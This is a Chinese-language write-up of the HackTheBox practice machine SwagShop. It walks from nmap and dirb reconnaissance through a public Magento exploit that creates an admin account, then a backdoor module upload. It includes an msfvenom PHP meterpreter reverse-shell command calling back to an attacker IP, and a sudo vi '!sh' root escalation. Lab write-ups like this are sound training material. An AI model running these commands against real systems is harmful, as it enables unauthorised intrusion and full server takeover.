**介绍**  

  

今天给大家带来的是一个HTB(hackthebox)的靶机—SwagShop，这是一个easy级别的linux系统的靶机，所以主要是对枚举,信息收集等手段的考察。对OSCP感兴趣的同学也可以去试着去HTB上找些靶机做做看。

![](../Images/5978c7882262a6faceb907d4861e733d.png)

  

![](../Images/7f2c76f2f9325abb7e9a1d5b070b8faa.png)

**信息收集**  

  

对目标进行一个初步的扫描。

**nmap -T4 -sC -sV10.10.10.140**

发现只对22端口以及80端口进行了开放。

![](../Images/3dfa02d71c5f97c477d2a76d42e15eab.png)

  

顺便对其进行目录遍历,我们发现一个有意思的目录,这个有用,后面再说。

**dirbhttp://10.10.10.140 /usr/share/dirb/wordlists/common.txt**

![](../Images/a4e68e0b779d20c2052c8b8120557049.png)

  

我们打开网站,通过火狐的插件Wappalyzer,或者网页logo就可以发现是个开源的电子商务网站。

![](../Images/8943d241d741c99dd96af1a4851e7072.png)

![](../Images/8c70bc4dbd99ed78f8331b55bead0c1a.png)

  

![](../Images/127827d55ea4d7541be1cf4b759e7dab.png)

**漏洞利用**  

  

通过**searchsploit**搜索发现漏洞还是挺多的。

![](../Images/2287cfab16b626c0d34a314e800aaf1c.png)

  

我们发现一个RCE漏洞吸引了我们的注意力，所以我们选择37977的漏洞试试，把**exp**cp到我们的目录，发现这个脚本可以创建一个**admin**权限的账户。但是我们需要改变一下里面的内容，target为我们的目标**ip:http://10.10.10.140/index.php，**并且删除一些不必要的注释。

参考地址:http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/

此时运行我们的exp

![](../Images/32eabe69210eac0bd7235bfe6d95b391.png)

  

显示我们的exp运行了，但是这个后台地址是不对的，这就要用到刚刚我们扫到的地址了，

**http://10.10.10.140/downloader/**

这个地址也可以直接用exp添加的账户进行登陆

![](../Images/5d24d5eab48e99ba403c071abae32910.png).

  

我们成功登陆了后台，之后我们可以用在google找到的后门项目进行备份还原来拿shell，

https://github.com/P34C3-07/LavaMagentoBD

  

我们可以用msf来生成一个php后门，

msfvenom -pphp/meterpreter/reverse\_tcp LHOST=10.10.14.175 LPORT=4444 -f raw >shell.php

之后在压缩包放置你的shell,这里我的路径是

/app/code/community/Lavalamp/Connector/IndexController.php

用Directpackage file upload功能进行上传

![](../Images/99a877830773d4db9345aab980b4393b.png)

  

上传成功.

接下来msf进行监听,成功返回shell。

![](../Images/c52909ec1c38d130ed0161c5f8800b56.png)

  

我们可以在/home/haris找到第一个user.txt

![](../Images/c08f59917af64dc503425d5f4a541b15.png)

**提权**

  

接下来我们要进行提权,sudo-l看一下,发现可以不用密码就以root权限执行vi。

![](../Images/22b223f5e47e18bda796db395d60c5f5.png)

  

我们可以去/var/www/html/目录下创建一个文件，利用vi的-c参数进行提权,我们利用这条指令即可提权，如图显示提权成功,获取到root.txt

sudo   vi  /var/www/html/111  -c  '!sh'

![](../Images/25bff9cb4ca36f002be22576904489fd.png)
